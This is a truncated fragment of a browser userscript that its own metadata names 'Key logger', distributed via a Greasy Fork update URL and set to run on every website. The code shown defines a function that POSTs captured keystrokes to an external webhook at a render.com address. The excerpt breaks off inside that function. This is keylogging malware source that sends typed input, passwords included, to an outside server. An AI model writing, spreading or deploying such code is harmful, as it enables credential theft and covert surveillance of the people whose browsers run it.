...
// @match        *://*/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/545649/Key%20logger.user.js
// @updateURL https://update.greasyfork.org/scripts/545649/Key%20logger.meta.js
// ==/UserScript==
...
(function() {
    ...
    function sendKeystrokesToServer(keystrokes) {
        fetch('https://flask-webhook-1bsi.onrender.com/collect', {
            method: 'POST',
            headers: {
